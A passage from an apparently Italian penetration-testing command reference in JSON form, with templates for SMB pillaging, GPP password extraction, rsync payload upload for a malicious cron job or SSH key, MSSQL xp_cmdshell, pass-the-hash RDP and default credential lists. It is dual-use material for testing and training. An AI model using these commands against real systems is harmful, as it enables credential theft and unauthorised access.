    "subcategory": "smb",
    "group": "Pillaging",
    "description": "Cerca password dentro i file Groups.xml in SYSVOL: le vecchie Group Policy Preferences salvano una password cifrata con una chiave pubblica, quindi decifrabile subito.",
    "platform": "linux",
    "requires": [
      "password",
      "hash"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "nxc",
      "gpp",
      "sysvol",
      "ms14-025"
    ],
    "template": "nxc smb <ip> -u '<user>' -p '<password>' -M gpp_password",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ],
    "variants": [
      {
        "id": "gpp",
        "label": "GPP password",
        "template": "nxc smb <ip> -u '<user>' -p '<password>' -M gpp_password",
        "description": "Password nei `Groups.xml` di `SYSVOL` (`cpassword` cifrato con chiave AES nota, `MS14-025`)."
      },
      {
        "id": "autologin",
        "label": "GPP autologin",
        "template": "nxc smb <ip> -u '<user>' -p '<password>' -M gpp_autologin",
        "description": "Credenziali di autologon lasciate nei GPP (`Registry.xml`): utente e password in chiaro."
      }
    ]
  },
  {
    "id": "nxc-smb-spider",
    "name": "nxc smb — spider shares",
    "category": "service-enum",
    "subcategory": "smb",
    "group": "Pillaging",
    "description": "Con il modulo spider_plus elenca e, se richiesto, scarica i file leggibili sulle condivisioni.",
    "platform": "linux",
    "requires": [
      "password",
      "hash"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "nxc",
      "spider",
      "shares",
      "pillaging",
      "download"
    ],
    "template": "nxc smb <ip> -u '<user>' -p '<password>' -M spider_plus",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "share",
        "label": "Share",
        "placeholder": "Departments"
      },
      {
        "key": "outdir",
        "label": "Output folder",
        "placeholder": "/home/kali/loot"
      }
    ],
    "variants": [
      {
        "id": "enum",
        "label": "Enumera",
        "template": "nxc smb <ip> -u '<user>' -p '<password>' -M spider_plus",
        "description": "Solo elenco dei file leggibili su tutte le share (salva un JSON), niente download."
      },
      {
        "id": "enum-share",
        "label": "Enumera una share",
        "template": "nxc smb <ip> -u '<user>' -p '<password>' -M spider_plus --share '<share>'",
        "description": "Limita l'enumerazione a una singola share."
      },
      {
        "id": "download",
        "label": "Scarica tutto",
        "template": "nxc smb <ip> -u '<user>' -p '<password>' -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=104857600 OUTPUT_FOLDER=<outdir>",
        "description": "Scarica tutti i file leggibili in `<outdir>`. `MAX_FILE_SIZE` alzato per non saltare i file grandi."
      },
      {
        "id": "download-share",
        "label": "Scarica una share",
        "template": "nxc smb <ip> -u '<user>' -p '<password>' --share '<share>' -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=104857600 OUTPUT_FOLDER=<outdir>",
        "description": "Scarica solo da una share specifica dentro `<outdir>`."
      }
    ],
    "note": "# Opzioni\n- `-M spider_plus` elenca i file e salva un riepilogo, senza scaricare\n- `-o DOWNLOAD_FLAG=true` scarica i file trovati\n- `-o OUTPUT_FOLDER=<dir>` cartella locale di destinazione\n- `--share '<share>'` limita a una condivisione\n# Errori comuni\nDi default scarica solo i file sotto i 50 KB: per prendere tutto alza il limite con `MAX_FILE_SIZE`. Per una cartella precisa o un singolo file conviene smbclient."
  },
  {
    "id": "smbmap-r",
    "name": "smbmap — recursive listing",
    "category": "service-enum",
    "subcategory": "smb",
    "group": "Pillaging",
    "description": "Percorre ogni condivisione in modo ricorsivo, mostrando l'albero dei file fino alla profondita indicata.",
    "platform": "linux",
    "requires": [
      "password",
      "hash"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "smbmap",
      "shares",
      "pillaging"
    ],
    "template": "smbmap -H <ip> -u '<user>' -p '<password>' -R --depth 5",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ],
    "note": "# Opzioni\n- `-R` elenco ricorsivo\n- `--depth` limita quanto in profondita scendere"
  },
  {
    "id": "smbclient-mget",
    "name": "smbclient — recursive download",
    "category": "service-enum",
    "subcategory": "smb",
    "group": "Pillaging",
    "description": "Scarica un'intera condivisione in modo ricorsivo con un solo comando.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "smb"
    ],
    "tags": [
      "smbclient",
      "download"
    ],
    "template": "smbclient //<ip>/<share> -U '<user>%<password>' -c 'recurse; prompt; mget *'",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "share",
        "label": "Share",
        "placeholder": "Departments"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "jdoe"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ]
  },
  {
    "id": "rtsp-enum",
    "name": "RTSP — nmap enum",
    "category": "service-enum",
    "subcategory": "rtsp",
    "group": "Enumeration",
    "description": "Lo streaming delle telecamere IP (RTSP, porte 554 e 8554). Enumera i metodi supportati dal server e i percorsi di stream validi, da cui poi si apre il flusso video.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "rtsp"
    ],
    "tags": [
      "rtsp",
      "camera",
      "nmap"
    ],
    "template": "nmap -sV --script \"rtsp-methods,rtsp-url-brute\" -p554,8554 <ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "refs": [
      {
        "label": "HackTricks — 554 Pentesting RTSP",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/554-8554-pentesting-rtsp.html"
      }
    ],
    "note": "# Opzioni\n- `rtsp-methods` elenca i verbi supportati (DESCRIBE, SETUP, PLAY)\n- `rtsp-url-brute` trova i percorsi di stream validi, per esempio `/live.sdp`"
  },
  {
    "id": "ipmi-enum",
    "name": "IPMI — enumerazione BMC (nmap)",
    "category": "service-enum",
    "subcategory": "ipmi",
    "group": "Enumeration",
    "description": "Il controller di gestione della scheda madre (BMC) risponde su UDP 623. Lo script ipmi-version ne rivela versione e livelli di autenticazione; ipmi-cipher-zero segnala se accetta il Cipher 0, una modalita che bypassa del tutto l'autenticazione.",
    "note": "# Prossimo passo\nIPMI 2.0 ha una falla nel protocollo RAKP che permette di estrarre gli hash delle password degli utenti validi prima dell'autenticazione: vedi il comando di dump nella fase di Exploitation. Gli hash si craccano con hashcat (modalita 7300).",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "ipmi"
    ],
    "tags": [
      "ipmi",
      "bmc",
      "nmap",
      "enum"
    ],
    "template": "# versione del BMC e verifica del Cipher 0 (UDP 623)\nnmap -sU -p623 --script ipmi-version,ipmi-cipher-zero <ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "rsync-enum",
    "name": "rsync — moduli & accesso",
    "category": "service-enum",
    "subcategory": "rsync",
    "group": "Enumeration",
    "description": "Il demone rsync sulla porta 873 espone dei moduli, ciòè cartelle condivise. Senza autenticazione si elencano i moduli e, se sono aperti, si sfogliano e si scaricano i file. Un modulo scrivibile permette di piazzare una chiave SSH o un job cron sull'host.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "rsync"
    ],
    "tags": [
      "rsync",
      "873",
      "file-share"
    ],
    "template": "rsync -av --list-only rsync://<ip>/",
    "params": [
      {
        "key": "ip",
        "label": "IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "module",
        "label": "Modulo",
        "placeholder": "share"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Lista moduli",
        "template": "rsync -av --list-only rsync://<ip>/",
        "description": "Elenca i moduli condivisi dal demone. Ognuno è un potenziale punto di lettura o scrittura."
      },
      {
        "id": "browse",
        "label": "Sfoglia modulo",
        "template": "rsync -av --list-only rsync://<ip>/<module>/",
        "description": "Lista i file dentro un modulo senza scaricarli, per capire cosa contiene."
      },
      {
        "id": "download",
        "label": "Scarica file",
        "template": "rsync -av rsync://<ip>/<module>/ ./loot/",
        "description": "Scarica ricorsivamente il contenuto del modulo in locale per il pillaging."
      },
      {
        "id": "upload",
        "label": "Carica (se scrivibile)",
        "template": "rsync -av ./payload rsync://<ip>/<module>/",
        "description": "Scrive un file nel modulo, se il demone lo consente: utile per una chiave SSH o un cron malevolo."
      }
    ]
  },
  {
    "id": "mssql-login",
    "name": "impacket — mssqlclient login",
    "category": "service-enum",
    "subcategory": "mssql",
    "group": "Connection",
    "description": "Connessione a MSSQL via TDS. Esistono due modi di login: SQL auth, con account interni al database come `sa`, e Windows auth, con account di dominio via NTLM. La variante va scelta di conseguenza.",
    "platform": "linux",
    "requires": [
      "password",
      "hash"
    ],
    "protocols": [
      "mssql"
    ],
    "tags": [
      "impacket",
      "mssql"
    ],
    "template": "impacket-mssqlclient <user>:<password>@<ip>",
    "params": [
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "sa"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "corp.local"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "SQL auth",
        "template": "impacket-mssqlclient <user>:<password>@<ip>",
        "description": "Autenticazione SQL Server: `<user>` è un login interno al DB (tipico `sa`). Niente `-windows-auth`, le credenziali NON sono di dominio."
      },
      {
        "id": "windows-auth",
        "label": "Windows auth",
        "template": "impacket-mssqlclient <domain>/<user>:<password>@<ip> -windows-auth",
        "description": "Autenticazione Windows/AD via NTLM. `-windows-auth` impone l'uso dell'account di dominio `<domain>/<user>` invece di un login SQL. Per un account locale della macchina il dominio va valorizzato con il nome host oppure con `.`."
      }
    ],
    "note": "# Credenziali di default\nL'account `sa` è il bersaglio: \n- `sa:` (vuota)\n- `sa:sa`\n- `sa:Password123`\n- `sa:password`\n- `sa:sql`. \n\nCon Windows auth prova le credenziali di dominio già in mano."
  },
  {
    "id": "nxc-mssql",
    "name": "nxc mssql — login & query",
    "category": "service-enum",
    "subcategory": "mssql",
    "group": "Connection",
    "description": "Verifica le credenziali su MSSQL ed esegue query o comandi del sistema operativo. Supporta l'autenticazione con password o con hash NTLM.",
    "platform": "linux",
    "requires": [
      "password",
      "hash"
    ],
    "protocols": [
      "mssql"
    ],
    "tags": [
      "nxc",
      "netexec",
      "mssql"
    ],
    "template": "nxc mssql <ip> -u '<user>' -p '<password>' --local-auth",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "sa"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Login (local-auth)",
        "template": "nxc mssql <ip> -u '<user>' -p '<password>' --local-auth",
        "description": "Login SQL locale. Togli `--local-auth` per l’autenticazione di dominio (Windows auth)."
      },
      {
        "id": "query",
        "label": "Query",
        "template": "nxc mssql <ip> -u '<user>' -p '<password>' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases'",
        "description": "Esegue una query T-SQL e stampa il risultato."
      },
      {
        "id": "exec",
        "label": "Comando OS",
        "template": "nxc mssql <ip> -u '<user>' -p '<password>' --local-auth -x 'whoami'",
        "description": "Esegue un comando OS via `xp_cmdshell`, abilitandolo al volo se i privilegi lo consentono."
      }
    ],
    "refs": [
      {
        "label": "HackTricks — 1433 Pentesting MSSQL",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html"
      }
    ],
    "note": "# Opzioni\n- `-q '<query>'` esegue una query SQL\n- `-x '<cmd>'` esegue un comando del sistema operativo tramite xp_cmdshell\n- `-H <hash>` autentica con l'hash NTLM (Pass-the-Hash)\n- `--local-auth` login come account locale dell'istanza invece che di dominio"
  },
  {
    "id": "nmap-mssql",
    "name": "nmap — MSSQL scripts",
    "category": "service-enum",
    "subcategory": "mssql",
    "group": "Connection",
    "description": "Script NSE: versione/istanza, configurazione, login con password vuota e info NTLM (rivela hostname e dominio senza autenticazione).",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "mssql"
    ],
    "tags": [
      "nmap",
      "mssql"
    ],
    "template": "nmap -p1433 --script ms-sql-info,ms-sql-config,ms-sql-empty-password,ms-sql-ntlm-info <ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "mssql-roles",
    "name": "MSSQL — ruoli & privilegi",
    "category": "service-enum",
    "subcategory": "mssql",
    "group": "Enumeration",
    "description": "Dentro la sessione MSSQL serve a capire quali azioni sono possibili prima di attaccare. `IS_SRVROLEMEMBER('sysadmin')` torna `1` con il ruolo sysadmin attivo, che consente xp_cmdshell diretto, e `0` altrimenti, caso in cui serve un altro vettore come l'impersonation. L'ultima query elenca i login impersonabili.",
    "platform": "cross-platform",
    "requires": [
      "password"
    ],
    "protocols": [
      "mssql"
    ],
    "tags": [
      "mssql",
      "roles",
      "impersonate",
      "privesc"
    ],
    "template": "SELECT IS_SRVROLEMEMBER('sysadmin');",
    "params": [],
    "variants": [
      {
        "id": "sysadmin",
        "label": "Sei sysadmin?",
        "template": "SELECT IS_SRVROLEMEMBER('sysadmin');",
        "description": "`1` indica ruolo sysadmin attivo e quindi xp_cmdshell diretto, `0` il contrario, `NULL` un nome di ruolo scritto male."
      },
      {
        "id": "whoami",
        "label": "Identità corrente",
        "template": "SELECT SYSTEM_USER AS login, USER_NAME() AS db_user, IS_SRVROLEMEMBER('sysadmin') AS is_sa;",
        "description": "Login corrente, utente nel database e presenza del ruolo sysadmin, in una sola riga."
      },
      {
        "id": "impersonate",
        "label": "Chi posso impersonare",
        "template": "SELECT DISTINCT b.name FROM sys.server_permissions a JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';",
        "description": "Login su cui è concesso il permesso `IMPERSONATE`. La comparsa di `sa` o di un sysadmin apre la scalata con `EXECUTE AS LOGIN`."
      }
    ],
    "refs": [
      {
        "label": "HackTricks — Pentesting MSSQL",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server.html"
      }
    ],
    "note": "# Output atteso\n`IS_SRVROLEMEMBER('sysadmin')` torna:\n- `1`: sei sysadmin, quindi xp_cmdshell diretto\n- `0`: non sei sysadmin, serve un altro vettore come l'impersonation\n- `NULL`: il nome del ruolo è scritto male"
  },
  {
    "id": "oracle-tns-enum",
    "name": "Oracle TNS — enumerazione listener",
    "category": "service-enum",
    "subcategory": "oracle",
    "group": "Enumeration",
    "description": "Interroga il listener TNS sulla 1521 per versione e stato e tenta il brute dei SID/service name. Senza un SID valido non ci si collega al database, quindi è il primo passo.",
    "note": "# Output atteso\nUn SID valido (per esempio XE, ORCL o PROD) è la chiave per il login. Le versioni vecchie del listener permettono anche query di stato senza autenticazione.\n# Errori comuni\ntnscmd10g è datato ma ancora utile sui target vecchi: se non risponde, affidati agli script di nmap e al modulo sidguesser di odat.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "oracle"
    ],
    "tags": [
      "oracle",
      "tns",
      "sid",
      "enum"
    ],
    "template": "# versione e stato del listener TNS\ntnscmd10g version -h <ip>\ntnscmd10g status -h <ip>\n\n# nmap: versione TNS e brute dei SID\nnmap -p1521 --script oracle-tns-version,oracle-sid-brute <ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "oracle-enum-queries",
    "name": "Oracle — query di enumerazione",
    "category": "service-enum",
    "subcategory": "oracle",
    "group": "Enumeration",
    "description": "Query da eseguire nella sessione sqlplus per capire versione, utenti e soprattutto i propri privilegi: la risposta decide se puntare alla lettura dei file o all'esecuzione di comandi.",
    "note": "# Output atteso\nSe i privilegi di sistema mostrano permessi come CREATE ANY o JAVA, oppure il ruolo DBA (amministratore del database), si e vicini all'esecuzione di comandi. L'elenco degli utenti fornisce i nomi per il riuso delle credenziali.\n# Errori comuni\nMolte viste richiedono privilegi: se l'elenco di tutte le tabelle e vuoto non si e amministratori, conviene restare sulle viste dei propri oggetti e dei propri ruoli.",
    "platform": "cross-platform",
    "requires": [
      "password"
    ],
    "protocols": [
      "oracle"
    ],
    "tags": [
      "oracle",
      "sql",
      "enum"
    ],
    "template": "# versione e banner\nSELECT * FROM v$version;\n\n# utenti del database\nSELECT username FROM all_users;\n\n# i tuoi privilegi e ruoli (sei DBA?)\nSELECT * FROM user_sys_privs;\nSELECT * FROM user_role_privs;",
    "params": []
  },
  {
    "id": "oracle-sqlplus-login",
    "name": "Oracle — login sqlplus",
    "category": "service-enum",
    "subcategory": "oracle",
    "group": "Connection",
    "description": "Si collega al database con sqlplus usando credenziali trovate o di default. La stringa di connessione richiede SID o service name separato da slash.",
    "note": "# Credenziali di default\nscott/tiger, system/oracle, system/manager, dbsnmp/dbsnmp, sys/change_on_install (con as sysdba). Spesso restano attive.\n# Errori comuni\nSID diverso da service name: con il service name usa //<ip>:1521/<service>. Per sys serve il suffisso as sysdba.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "oracle"
    ],
    "tags": [
      "oracle",
      "sqlplus",
      "login"
    ],
    "template": "# login al database (SID dopo lo slash)\nsqlplus <user>/<password>@<ip>:1521/<sid>",
    "params": [
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "system"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "oracle"
      },
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "sid",
        "label": "SID",
        "placeholder": "XE"
      }
    ]
  },
  {
    "id": "odat-all",
    "name": "ODAT — audit Oracle automatico",
    "category": "service-enum",
    "subcategory": "oracle",
    "group": "ODAT",
    "description": "Oracle Database Attacking Tool: in un comando enumera SID, versioni, account di default e privilegi, segnalando i vettori sfruttabili. Punto di partenza pratico su un target Oracle.",
    "note": "# Output atteso\nodat prova molti moduli: annota i SID trovati, gli account validi e le capacità come lettura file o esecuzione comandi, da approfondire nella fase di Exploitation.\n# Errori comuni\nÈ rumoroso e lento: in laboratorio va bene, ma se il SID è già noto conviene lanciare i moduli mirati invece di all.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "oracle"
    ],
    "tags": [
      "oracle",
      "odat",
      "enum"
    ],
    "template": "# audit completo del target Oracle\nodat all -s <ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "sid",
        "label": "SID",
        "placeholder": "XE"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "all",
        "template": "odat all -s <ip>",
        "description": "Tutti i moduli: SID, account, privilegi, vettori."
      },
      {
        "id": "sidguesser",
        "label": "SID guesser",
        "template": "odat sidguesser -s <ip>",
        "description": "Brute dei SID e service name validi."
      },
      {
        "id": "passwordguesser",
        "label": "Password guesser",
        "template": "odat passwordguesser -s <ip> -d <sid> --accounts-file accounts/accounts.txt",
        "description": "Prova le credenziali di default note sul SID trovato."
      }
    ]
  },
  {
    "id": "showmount",
    "name": "showmount — list exports",
    "category": "service-enum",
    "subcategory": "nfs",
    "group": "Discovery",
    "description": "Elenca le condivisioni (export) che il server NFS mette a disposizione sulla rete.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "nfs"
    ],
    "tags": [
      "showmount",
      "nfs"
    ],
    "template": "showmount -e <ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "nmap-nfs",
    "name": "nmap — NFS scripts",
    "category": "service-enum",
    "subcategory": "nfs",
    "group": "Discovery",
    "description": "Esegue gli script di nmap per NFS: elenca gli export disponibili, ne mostra il contenuto e lo spazio, senza montare nulla.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "nfs"
    ],
    "tags": [
      "nmap",
      "nfs"
    ],
    "template": "nmap -p111,2049 --script nfs-showmount,nfs-ls,nfs-statfs <ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "nxc-nfs",
    "name": "nxc nfs — list shares",
    "category": "service-enum",
    "subcategory": "nfs",
    "group": "Discovery",
    "description": "Elenca gli export NFS e i relativi permessi con NetExec.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "nfs"
    ],
    "tags": [
      "nxc",
      "netexec",
      "nfs"
    ],
    "template": "nxc nfs <ip> --shares",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "refs": [
      {
        "label": "HackTricks — 2049 Pentesting NFS",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/nfs-service-pentesting.html"
      }
    ],
    "note": "# Opzioni\n`--enum-shares` aggiunge profondita all'analisi e mostra i file visibili in ogni export."
  },
  {
    "id": "mount-nfs",
    "name": "mount NFS share",
    "category": "service-enum",
    "subcategory": "nfs",
    "group": "Mounting",
    "description": "Monta in locale una condivisione NFS, dopo aver creato la cartella di mount. I file più interessanti sono quelli il cui proprietario (identificativo utente) si può impersonare in locale.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "nfs"
    ],
    "tags": [
      "nfs",
      "mount"
    ],
    "template": "sudo mount -t nfs <ip>:<share> /mnt/nfs -o nolock",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "share",
        "label": "Share",
        "placeholder": "/exports/data"
      }
    ],
    "note": "# Prossimo passo\nSe un file appartiene a un identificativo utente che puoi creare sulla tua macchina, crea quell'utente in locale per leggerlo o modificarlo. Collegato all'abuso di no_root_squash nella fase di privilege escalation."
  },
  {
    "id": "mysql-login",
    "name": "mysql — client login",
    "category": "service-enum",
    "subcategory": "mysql",
    "group": "Connection",
    "description": "Connessione al database MySQL. I primi tentativi sensati sono `root` con password vuota e le credenziali deboli o di default, frequenti sulle installazioni non irrobustite. La sessione ottenuta è il punto di partenza per verificare se si può arrivare all'esecuzione di comandi.",
    "note": "# Credenziali di default\n`root:` (vuota) · `root:root` · `root:password` · `root:toor` · `root:mysql` · `admin:admin`. Una root con password vuota è ancora comune in lab.",
    "platform": "linux",
    "requires": [
      "password"
    ],
    "protocols": [
      "mysql"
    ],
    "tags": [
      "mysql",
      "login"
    ],
    "template": "mysql -h <ip> -u <user> -p",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "root"
      }
    ],
    "refs": [
      {
        "label": "HackTricks — 3306 Pentesting MySQL",
        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mysql.html"
      }
    ]
  },
  {
    "id": "nmap-mysql",
    "name": "nmap — MySQL scripts",
    "category": "service-enum",
    "subcategory": "mysql",
    "group": "Connection",
    "description": "Script NSE: versione, password vuota su root, elenco database e info utenti, senza credenziali.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "mysql"
    ],
    "tags": [
      "nmap",
      "mysql"
    ],
    "template": "nmap -p3306 --script mysql-info,mysql-empty-password,mysql-databases,mysql-users <ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "xfreerdp",
    "name": "xfreerdp — RDP connect",
    "category": "service-enum",
    "subcategory": "rdp",
    "group": "Connection",
    "description": "Apre una sessione RDP grafica con credenziali valide. Sui certificati self-signed la connessione fallisce finché non si aggiunge `/cert:ignore` (già nel template); per un account di dominio serve `/d:<dominio>`. `/dynamic-resolution` adatta la finestra e `/clipboard` condivide gli appunti, comodo per trasferire comandi e file.",
    "platform": "linux",
    "requires": [
      "password",
      "hash",
      "ticket"
    ],
    "protocols": [
      "rdp"
    ],
    "tags": [
      "xfreerdp",
      "rdp"
    ],
    "template": "xfreerdp /v:<ip> /u:<user> /p:<password> /cert:ignore /dynamic-resolution /clipboard",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "user",
        "label": "User",
        "ctx": "user",
        "placeholder": "administrator"
      },
      {
        "key": "password",
        "label": "Password",
        "ctx": "password",
        "placeholder": "P@ssw0rd"
      },
      {
        "key": "hash",
        "label": "Hash NTLM",
        "ctx": "hash",
        "placeholder": "aad3b435..."
      },
      {
        "key": "fqdn",
        "label": "FQDN target",
        "placeholder": "dc01.corp.local"
      },
      {
        "key": "domain",
        "label": "Dominio",
        "ctx": "domain",
        "placeholder": "corp.local"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Password",
        "template": "xfreerdp /v:<ip> /u:<user> /p:<password> /cert:ignore /dynamic-resolution /clipboard",
        "description": "Auth con password (via NLA)."
      },
      {
        "id": "pth",
        "label": "PtH",
        "template": "xfreerdp /v:<ip> /u:<user> /pth:<hash> /dynamic-resolution",
        "description": "Pass-the-Hash con l'hash NTLM. Richiede Restricted Admin sul target."
      },
      {
        "id": "nla",
        "label": "NLA",
        "template": "xfreerdp /v:<ip> /u:<user> /p:<password> /sec:nla /dynamic-resolution",
        "description": "Forza NLA/CredSSP: negozia Kerberos (se ottiene un ticket) altrimenti NTLM. Default sui target moderni."
      },
      {
        "id": "tls",
        "label": "TLS",
        "template": "xfreerdp /v:<ip> /u:<user> /p:<password> /sec:tls /dynamic-resolution",
        "description": "Forza la sola sicurezza TLS, senza la mutua auth di CredSSP. Utile se l'NLA dà errori."
      },
      {
        "id": "rdp",
        "label": "RDP legacy",
        "template": "xfreerdp /v:<ip> /u:<user> /p:<password> /sec:rdp /dynamic-resolution",
        "description": "Standard RDP Security legacy (cifratura debole): quando l'NLA è disattivato sul target."
      },
      {
        "id": "kerberos",
        "label": "Kerberos",
        "template": "KRB5CCNAME=<user>.ccache xfreerdp /v:<fqdn> /u:<user> /d:<domain> /sec:nla /dynamic-resolution",
        "description": "Kerberos: serve un TGT nel ccache (`KRB5CCNAME`), l'FQDN del target (non l'IP) e un DC raggiungibile. Obbligatorio se NTLM è disabilitato."
      },
      {
        "id": "share",
        "label": "Con cartella condivisa",
        "template": "xfreerdp /v:<ip> /u:<user> /p:<password> /drive:share,/tmp/share /clipboard /dynamic-resolution"
      }
    ],
    "note": "# Cos'è NLA\nNLA (Network Level Authentication) impone l'autenticazione PRIMA che si apra la sessione RDP.\n- Attivo = meglio: nessuna schermata di login per chi non ha credenziali valide, e blocca gli exploit pre-auth come BlueKeep.\n- Disabilitato = peggio: chiunque raggiunge la schermata di login e i vecchi exploit pre-auth tornano sfruttabili.\n# NTLM o Kerberos?\nNLA (`/sec:nla`) usa CredSSP: tenta prima Kerberos e, senza ticket, ripiega su NTLM.\n- NTLM: connessione per IP con `/u /p` oppure `/pth:<hash>`, funziona anche senza DC.\n- Kerberos: richiede un TGT nel ccache (`export KRB5CCNAME=user.ccache`), l'FQDN del target al posto dell'IP e un DC raggiungibile. Obbligatorio quando sul target NTLM è disabilitato.\n# Capire cosa richiede il target\n- `nxc rdp <ip>` oppure `nmap -p3389 --script rdp-ntlm-info,rdp-enum-encryption <ip>` dicono se l'NLA è richiesto e mostrano FQDN e dominio, entrambi necessari per Kerberos.\n- Se l'auth NTLM fallisce con NLA attivo, il target vuole Kerberos: serve un TGT e un nuovo tentativo con l'FQDN.\n# I livelli /sec\n- `/sec:nla` = CredSSP (Kerberos/NTLM), default moderno\n- `/sec:tls` = solo TLS, senza mutua auth CredSSP\n- `/sec:rdp` = Standard RDP Security legacy e debole, quando l'NLA è disattivo"
  },
  {
    "id": "nmap-rdp",
    "name": "nmap — RDP info",
    "category": "service-enum",
    "subcategory": "rdp",
    "group": "Connection",
    "description": "rdp-ntlm-info svela hostname, dominio e versione OS senza login; rdp-enum-encryption verifica se NLA è richiesto.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "rdp"
    ],
    "tags": [
      "nmap",
      "rdp"
    ],
    "template": "nmap -p3389 --script rdp-ntlm-info,rdp-enum-encryption <ip>",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ]
  },
  {
    "id": "nxc-rdp",
    "name": "nxc rdp — check & screenshot",
    "category": "service-enum",
    "subcategory": "rdp",
    "group": "Connection",
